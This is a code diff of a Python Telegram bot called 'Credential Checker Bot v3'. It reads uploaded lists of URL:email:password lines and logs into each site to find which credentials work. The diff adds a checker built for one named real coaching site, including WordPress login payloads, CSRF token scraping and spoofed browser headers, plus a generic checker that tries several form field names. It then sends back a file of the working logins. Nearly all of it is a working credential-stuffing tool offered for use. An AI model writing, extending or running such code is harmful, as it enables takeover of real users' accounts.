@@ -7,7 +7,7 @@ import asyncio
 import re
 import json
 from datetime import datetime
-from urllib.parse import urljoin, urlparse
+from urllib.parse import urljoin, urlparse, parse_qs
 
 # Fix for Pyrogram on Python 3.14+
 try:
@@ -25,14 +25,12 @@ ALLOWED_USERS = []
 if ADMINS:
     ALLOWED_USERS = [int(id.strip()) for id in ADMINS.split(',') if id.strip().isdigit()]
 
-# Logging
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
 )
 logger = logging.getLogger(__name__)
 
-# --- Security Middleware ---
 def is_admin(user_id):
     if not ALLOWED_USERS:
         return False
@@ -47,12 +45,10 @@ def health_check():
 
 def run_flask():
     port = int(os.environ.get("PORT", 8080))
-    logger.info(f"Starting Flask health server on port {port}")
     flask_app.run(host="0.0.0.0", port=port, use_reloader=False, threaded=True)
 
 # --- Credential Parser ---
 def parse_credential_line(line):
-    """Parse line in format: URL:email/username:password"""
     line = line.strip()
     if not line or line.startswith('#'):
         return None
@@ -70,171 +66,270 @@ def parse_credential_line(line):
     
     return (url, username, password)
 
-# --- Better Credential Checking Logic ---
-async def check_credential(session, url, username, password):
+# --- Get Login Page Info First ---
+async def get_login_page_info(session, login_url):
+    """Fetch login page to extract form details, CSRF tokens, etc."""
+    try:
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+        }
+        
+        async with session.get(login_url, headers=headers, timeout=15, ssl=False) as response:
+            text = await response.text()
+            
+            # Extract form action URL
+            form_action = re.search(r'<form[^>]*action=["\']([^"\']+)["\']', text, re.IGNORECASE)
+            if form_action:
+                action_url = form_action.group(1)
+                if action_url.startswith('/'):
+                    parsed = urlparse(str(response.url))
+                    action_url = f"{parsed.scheme}://{parsed.netloc}{action_url}"
+                elif not action_url.startswith('http'):
+                    action_url = urljoin(str(response.url), action_url)
+            else:
+                action_url = str(response.url)
+            
+            # Look for CSRF token
+            csrf_token = None
+            csrf_patterns = [
+                r'name=["\']_token["\'][^>]*value=["\']([^"\']+)["\']',
+                r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
+                r'name=["\']csrf["\'][^>]*value=["\']([^"\']+)["\']',
+                r'value=["\']([^"\']+)["\'][^>]*name=["\']_token["\']',
+            ]
+            for pattern in csrf_patterns:
+                match = re.search(pattern, text, re.IGNORECASE)
+                if match:
+                    csrf_token = match.group(1)
+                    break
+            
+            # Check for WordPress
+            is_wordpress = 'wp-' in text.lower() or 'wordpress' in text.lower()
+            
+            # Get cookies
+            cookies = response.cookies
+            
+            return {
+                'action_url': action_url,
+                'csrf_token': csrf_token,
+                'is_wordpress': is_wordpress,
+                'cookies': cookies,
+                'original_url': str(response.url)
+            }
+            
+    except Exception as e:
+        logger.error(f"Error getting login page: {e}")
+        return None
+
+# --- Check Specific Site: coaching.miteshkhatri.com ---
+async def check_mitesh_khatri(session, email, password, login_info=None):
     """
-    Improved credential checker with multiple validation methods
-    Returns: (is_valid, debug_info)
+    Custom checker for coaching.miteshkhatri.com
+    Based on HTML: WordPress site with Email/Password fields
     """
     
-    # First, try to find the actual login endpoint
-    login_endpoints = [
-        url,
-        url.rstrip('/') + '/login',
-        url.rstrip('/') + '/auth/login',
-        url.rstrip('/') + '/api/login',
-        url.rstrip('/') + '/signin',
-        url.rstrip('/') + '/authenticate',
-    ]
+    login_url = "https://coaching.miteshkhatri.com/login"
     
-    # Common field name combinations
-    field_combos = [
-        {'username': username, 'password': password},
-        {'email': username, 'password': password},
-        {'user': username, 'password': password},
-        {'login': username, 'password': password},
-        {'Username': username, 'Password': password},
-        {'Email': username, 'Password': password},
-        {'user_login': username, 'user_pass': password},
-        {'log': username, 'pwd': password},
-    ]
+    # Get login page first if not provided
+    if not login_info:
+        login_info = await get_login_page_info(session, login_url)
+        if not login_info:
+            return (False, "Could not fetch login page")
     
     headers = {
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0',
         'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
         'Accept-Language': 'en-US,en;q=0.5',
         'Content-Type': 'application/x-www-form-urlencoded',
-        'Referer': url
+        'Origin': 'https://coaching.miteshkhatri.com',
+        'Referer': 'https://coaching.miteshkhatri.com/login',
     }
     
-    for endpoint in login_endpoints:
-        for payload in field_combos:
-            try:
-                # Store cookies to track session
-                async with session.post(
-                    endpoint,
-                    data=payload,
-                    headers=headers,
-                    allow_redirects=True,
-                    timeout=20,
-                    ssl=False  # Some sites have SSL issues
-                ) as response:
-                    
-                    final_url = str(response.url)
-                    status = response.status
-                    text = await response.text()
-                    text_lower = text.lower()
-                    
-                    # Get cookies
-                    cookies = response.cookies
-                    has_session_cookie = any(
-                        name.lower() in str(cookies).lower() 
-                        for name in ['session', 'token', 'auth', 'sid', 'jwt', 'id', 'user']
-                    )
-                    
-                    # === STRICT VALIDATION CHECKS ===
-                    
-                    # 1. Check if redirected AWAY from login page (GOOD SIGN)
-                    parsed_original = urlparse(endpoint)
-                    parsed_final = urlparse(final_url)
-                    
-                    login_keywords = ['login', 'signin', 'auth', 'authenticate', 'log-in', 'sign-in']
-                    is_still_on_login = any(kw in parsed_final.path.lower() for kw in login_keywords)
-                    moved_away_from_login = not is_still_on_login and parsed_original.path != parsed_final.path
-                    
-                    # 2. Check for failure indicators (BAD)
-                    failure_patterns = [
-                        'invalid', 'incorrect', 'wrong password', 'wrong username',
-                        'authentication failed', 'login failed', 'sign in failed',
-                        'invalid credentials', 'access denied', 'unauthorized',
-                        'error', 'failed', 'try again', 'does not exist',
-                        'account locked', 'suspended', 'banned', 'not found',
-                        'password is incorrect', 'username is incorrect',
-                        'email or password is incorrect', 'invalid email',
-                        'invalid username', 'invalid password'
-                    ]
-                    
-                    has_failure = any(pattern in text_lower for pattern in failure_patterns)
-                    
-                    # 3. Check for success indicators (GOOD)
-                    success_patterns = [
-                        'logout', 'sign out', 'log out', 'my account',
-                        'profile', 'dashboard', 'welcome back', 'hello,',
-                        'settings', 'account settings', 'personal info',
-                        'you are logged in', 'successfully logged in',
-                        'login successful', 'authentication successful'
-                    ]
-                    
-                    has_success = any(pattern in text_lower for pattern in success_patterns)
-                    
-                    # 4. Check response size (login error pages are usually smaller)
-                    content_length = len(text)
-                    
-                    # 5. Check for JSON success response
-                    is_json_success = False
-                    try:
-                        json_data = json.loads(text)
-                        if isinstance(json_data, dict):
-                            # Check for token/session in response
-                            if any(k in json_data for k in ['token', 'access_token', 'session', 'user', 'data', 'success']):
-                                if json_data.get('success') == True or 'token' in json_data:
-                                    is_json_success = True
-                            # Check for error in JSON
-                            if 'error' in json_data or json_data.get('success') == False:
-                                has_failure = True
-                    except:
-                        pass
-                    
-                    # === DECISION LOGIC ===
-                    
-                    # Strong indicators of SUCCESS:
-                    strong_success = (
-                        (moved_away_from_login and has_session_cookie and not has_failure) or
-                        (has_session_cookie and has_success and not has_failure) or
-                        is_json_success
-                    )
-                    
-                    # Strong indicators of FAILURE:
-                    strong_failure = (
-                        has_failure or
-                        (is_still_on_login and has_failure) or
-                        (status == 401 or status == 403)
-                    )
-                    
-                    # Build debug info
-                    debug_info = {
-                        'endpoint': endpoint,
-                        'status': status,
-                        'final_url': final_url,
-                        'moved_away': moved_away_from_login,
-                        'has_session': has_session_cookie,
-                        'has_success_text': has_success,
-                        'has_failure_text': has_failure,
-                        'content_length': content_length,
-                        'is_json_success': is_json_success
-                    }
-                    
-                    if strong_success:
-                        return (True, debug_info)
-                    
-                    if strong_failure:
-                        return (False, debug_info)
-                    
-                    # Ambiguous case - log for debugging
-                    logger.info(f"Ambiguous result for {url} - needs manual check")
-                    
-            except Exception as e:
-                continue
+    # WordPress login payload
+    payload = {
+        'log': email,  # WordPress uses 'log' for username/email
+        'pwd': password,  # WordPress uses 'pwd' for password
+        'rememberme': 'forever',
+        'wp-submit': 'Log In',
+        'redirect_to': 'https://coaching.miteshkhatri.com/wp-admin/',
+        'testcookie': '1'
+    }
     
-    # If all attempts failed
-    return (False, {'error': 'All login attempts failed'})
+    # Add CSRF if found
+    if login_info.get('csrf_token'):
+        payload['_token'] = login_info['csrf_token']
+    
+    try:
+        async with session.post(
+            login_info['action_url'],
+            data=payload,
+            headers=headers,
+            allow_redirects=True,
+            timeout=20,
+            ssl=False
+        ) as response:
+            
+            final_url = str(response.url)
+            text = await response.text()
+            text_lower = text.lower()
+            
+            # Get all cookies
+            cookies = response.cookies
+            cookie_str = str(cookies)
+            
+            debug_info = {
+                'status': response.status,
+                'final_url': final_url,
+                'has_wordpress_logged_in_cookie': 'wordpress_logged_in' in cookie_str,
+                'has_wp_settings_cookie': 'wp-settings' in cookie_str,
+                'cookies_received': list(cookies.keys()) if cookies else [],
+                'content_preview': text[:500]
+            }
+            
+            # === SUCCESS INDICATORS for WordPress ===
+            
+            # 1. WordPress logged_in cookie (STRONGEST indicator)
+            if 'wordpress_logged_in' in cookie_str:
+                return (True, {**debug_info, 'reason': 'WordPress logged_in cookie found'})
+            
+            # 2. Redirected to wp-admin or dashboard
+            if '/wp-admin' in final_url or '/dashboard' in final_url:
+                if 'wp-login.php' not in final_url:
+                    return (True, {**debug_info, 'reason': 'Redirected to admin area'})
+            
+            # 3. Contains logout link (user is logged in)
+            if any(x in text_lower for x in ['logout', 'log out', 'sign out', 'wp-logout']):
+                if 'login' not in final_url.lower() or final_url.count('/') > 3:
+                    return (True, {**debug_info, 'reason': 'Logout link found'})
+            
+            # 4. Profile/dashboard content
+            if any(x in text_lower for x in ['my account', 'profile', 'dashboard', 'welcome']) and \
+               'error' not in text_lower and 'incorrect' not in text_lower:
+                return (True, {**debug_info, 'reason': 'Dashboard content found'})
+            
+            # === FAILURE INDICATORS ===
+            
+            failure_signs = [
+                'incorrect password' in text_lower,
+                'invalid username' in text_lower,
+                'invalid email' in text_lower,
+                'unknown email' in text_lower,
+                'login failed' in text_lower,
+                'authentication failed' in text_lower,
+                'error' in text_lower and 'login' in text_lower,
+                'the password you entered' in text_lower,
+                'is incorrect' in text_lower,
+                'lost your password' in text_lower and 'error' in text_lower,
+                response.status == 403,
+                'wp-login.php' in final_url and 'redirect_to' not in final_url,
+                'shake' in text_lower and 'login' in text_lower,  # WordPress shake animation on error
+            ]
+            
+            if any(failure_signs):
+                return (False, {**debug_info, 'reason': 'Login failure indicators found'})
+            
+            # === AMBIGUOUS - Need more checks ===
+            
+            # If still on login page
+            if 'wp-login.php' in final_url or '/login' in final_url:
+                # Check if there's an error message div
+                if re.search(r'class=["\'][^"\']*error[^"\']*["\']', text, re.IGNORECASE):
+                    return (False, {**debug_info, 'reason': 'Error class found on login page'})
+                
+                # Check for WordPress login form still present
+                if 'id="loginform"' in text_lower or 'name="loginform"' in text_lower:
+                    return (False, {**debug_info, 'reason': 'Login form still present'})
+            
+            return (False, {**debug_info, 'reason': 'Could not determine login status'})
+            
+    except Exception as e:
+        return (False, {'error': str(e)})
 
-# --- Main Processing Function ---
+# --- Generic Checker for Other Sites ---
+async def check_generic_site(session, url, username, password):
+    """Generic checker for non-specific sites"""
+    
+    login_info = await get_login_page_info(session, url)
+    if not login_info:
+        return (False, "Could not fetch login page")
+    
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+        'Referer': login_info['original_url'],
+    }
+    
+    # Try multiple field combinations
+    field_combos = [
+        {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': login_info['original_url'].rstrip('/') + '/wp-admin/'},
+        {'email': username, 'password': password},
+        {'username': username, 'password': password},
+        {'user': username, 'pass': password},
+        {'login': username, 'password': password},
+    ]
+    
+    for payload in field_combos:
+        try:
+            async with session.post(
+                login_info['action_url'],
+                data=payload,
+                headers=headers,
+                allow_redirects=True,
+                timeout=15,
+                ssl=False
+            ) as response:
+                
+                final_url = str(response.url)
+                text = await response.text()
+                text_lower = text.lower()
+                cookies = str(response.cookies)
+                
+                # Success checks
+                success = (
+                    'wordpress_logged_in' in cookies or
+                    ('/wp-admin' in final_url and 'wp-login' not in final_url) or
+                    ('logout' in text_lower and 'login' not in final_url.lower()) or
+                    ('dashboard' in text_lower and 'error' not in text_lower)
+                )
+                
+                # Failure checks
+                failure = (
+                    'incorrect' in text_lower or
+                    'invalid' in text_lower or
+                    'error' in text_lower and 'login' in text_lower or
+                    'wp-login.php' in final_url
+                )
+                
+                if success and not failure:
+                    return (True, {'method': 'generic', 'final_url': final_url})
+                
+                if failure:
+                    return (False, {'method': 'generic', 'reason': 'Failure indicators found'})
+                    
+        except Exception:
+            continue
+    
+    return (False, "All generic methods failed")
+
+# --- Main Checker Router ---
+async def check_credential(session, url, username, password):
+    """Route to appropriate checker based on URL"""
+    
+    url_lower = url.lower()
+    
+    # Site-specific checkers
+    if 'coaching.miteshkhatri.com' in url_lower or 'miteshkhatri.com' in url_lower:
+        return await check_mitesh_khatri(session, username, password)
+    
+    # Generic checker for other sites
+    return await check_generic_site(session, url, username, password)
+
+# --- Process Credentials ---
 async def process_credentials(client: Client, message: Message, file_path: str):
-    """Process the credential file and send results"""
     chat_id = message.chat.id
     
-    # Read file
     try:
         with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
             lines = f.readlines()
@@ -242,7 +337,6 @@ async def process_credentials(client: Client, message: Message, file_path: str):
         await message.reply_text(f"❌ Error reading file: {str(e)}")
         return
     
-    # Parse credentials
     credentials = []
     for line_num, line in enumerate(lines, 1):
         parsed = parse_credential_line(line)
@@ -252,26 +346,19 @@ async def process_credentials(client: Client, message: Message, file_path: str):
     total = len(credentials)
     
     if total == 0:
-        await message.reply_text("❌ No valid credentials found in file.\nFormat: URL:username:password")
+        await message.reply_text("❌ No valid credentials found.\nFormat: URL:username:password")
         return
     
-    await message.reply_text(f"🔍 Found {total} credentials to check. Starting...")
+    await message.reply_text(f"🔍 Found {total} credentials. Starting check...")
     
     valid_results = []
     invalid_results = []
     checked = 0
-    last_progress = 0
     
-    # Create session with cookie persistence
-    connector = aiohttp.TCPConnector(limit=30, limit_per_host=5, ssl=False)
-    timeout = aiohttp.ClientTimeout(total=30)
-    cookie_jar = aiohttp.CookieJar()
+    connector = aiohttp.TCPConnector(limit=20, limit_per_host=3, ssl=False)
+    timeout = aiohttp.ClientTimeout(total=25)
     
-    async with aiohttp.ClientSession(
-        connector=connector, 
-        timeout=timeout,
-        cookie_jar=cookie_jar
-    ) as session:
+    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
         
         for line_num, url, username, password in credentials:
             is_valid, debug_info = await check_credential(session, url, username, password)
@@ -282,59 +369,49 @@ async def process_credentials(client: Client, message: Message, file_path: str):
                 valid_results.append(log_entry)
                 logger.info(f"✅ VALID: {url} | {username}")
             else:
-                invalid_results.append(f"{log_entry} | Debug: {debug_info}")
+                # Save debug info for invalid
+                debug_str = json.dumps(debug_info, default=str)[:200]
+                invalid_results.append(f"{log_entry} | {debug_str}")
                 logger.info(f"❌ INVALID: {url} | {username}")
             
             checked += 1
-            progress = int((checked / total) * 100)
             
-            # Send progress every 10%
-            if progress >= last_progress + 10:
-                last_progress = (progress // 10) * 10
+            # Progress every 5 items or 10%
+            if checked % 5 == 0 or checked == total:
                 await message.reply_text(
-                    f"⏳ Progress: {last_progress}% ({checked}/{total})\n"
+                    f"⏳ Checked: {checked}/{total} ({int(checked/total*100)}%)\n"
                     f"✅ Valid: {len(valid_results)} | ❌ Invalid: {len(invalid_results)}"
                 )
             
-            # Delay to avoid rate limiting
-            await asyncio.sleep(1)
+            await asyncio.sleep(1.5)  # Delay to be respectful
     
-    # Send final results
+    # Final results
     summary = (
-        f"✅ **Check Complete!**\n\n"
+        f"✅ **Complete!**\n\n"
         f"📊 Total: {total}\n"
         f"✅ Valid: {len(valid_results)}\n"
         f"❌ Invalid: {len(invalid_results)}"
     )
     await message.reply_text(summary)
     
-    # Save valid credentials
+    # Send valid file
     if valid_results:
-        result_file = f"valid_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        result_file = f"VALID_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
         with open(result_file, 'w') as f:
             f.write('\n'.join(valid_results))
         
-        await message.reply_document(
-            result_file, 
-            caption=f"📁 Valid Credentials ({len(valid_results)})"
-        )
+        await message.reply_document(result_file, caption=f"✅ {len(valid_results)} Valid Credentials")
         os.remove(result_file)
-    else:
-        await message.reply_text("❌ No valid credentials found.")
     
-    # Optionally save invalid with debug info for troubleshooting
-    if len(invalid_results) > 0:
-        debug_file = f"debug_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    # Send debug file for invalid (first 30)
+    if invalid_results:
+        debug_file = f"DEBUG_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
         with open(debug_file, 'w') as f:
-            f.write('\n'.join(invalid_results[:50]))  # First 50 only
+            f.write('\n'.join(invalid_results[:30]))
         
-        await message.reply_document(
-            debug_file,
-            caption="🐛 Debug info (first 50 invalid)"
-        )
+        await message.reply_document(debug_file, caption=f"🐛 Debug info (first 30 invalid)")
         os.remove(debug_file)
     
-    # Cleanup
     os.remove(file_path)
 
 # --- Bot Handlers ---
@@ -346,16 +423,15 @@ async def start_handler(client, message: Message):
         return
 
     await message.reply_text(
-        "👨‍💻 **Credential Checker Bot v2**\n\n"
-        "**Format:** `URL:username:password`\n\n"
+        "👨‍💻 **Credential Checker Bot v3**\n\n"
+        "**Supported Sites:**\n"
+        "✅ coaching.miteshkhatri.com (WordPress)\n"
+        "✅ Generic WordPress sites\n"
+        "✅ Other sites (basic detection)\n\n"
+        "**Format:**\n"
+        "`URL:email:password`\n\n"
         "**Example:**\n"
-        "`https://site.com/login:myuser:mypass`\n\n"
-        "✅ **Improved Detection:**\n"
-        "- Checks multiple login endpoints\n"
-        "- Validates session cookies\n"
-        "- Detects actual redirects\n"
-        "- Parses JSON responses\n"
-        "- Filters out false positives"
+        "`https://coaching.miteshkhatri.com/login:test@email.com:mypass123`"
     )
 
 @app.on_message(filters.document)
@@ -363,8 +439,7 @@ async def handle_document(client, message: Message):
     if not is_admin(message.from_user.id):
         return
     
-    file_name = message.document.file_name
-    if not file_name.endswith('.txt'):
+    if not message.document.file_name.endswith('.txt'):
         await message.reply_text("❌ Send `.txt` file only.")
         return
     
@@ -374,7 +449,7 @@ async def handle_document(client, message: Message):
         await message.reply_text(f"❌ Download failed: {str(e)}")
         return
     
-    await message.reply_text("📥 File received. Checking credentials...")
+    await message.reply_text("📥 File received. Checking...")
     await process_credentials(client, message, file_path)
 
 @app.on_message(filters.private & ~filters.document & ~filters.command("start"))
@@ -383,7 +458,7 @@ async def private_handler(client, message: Message):
         return
     await message.reply_text("Send a `.txt` file or use /start")
 
-# --- Main Execution ---
+# --- Main ---
 if __name__ == "__main__":
     flask_thread = threading.Thread(target=run_flask)
     flask_thread.daemon = True
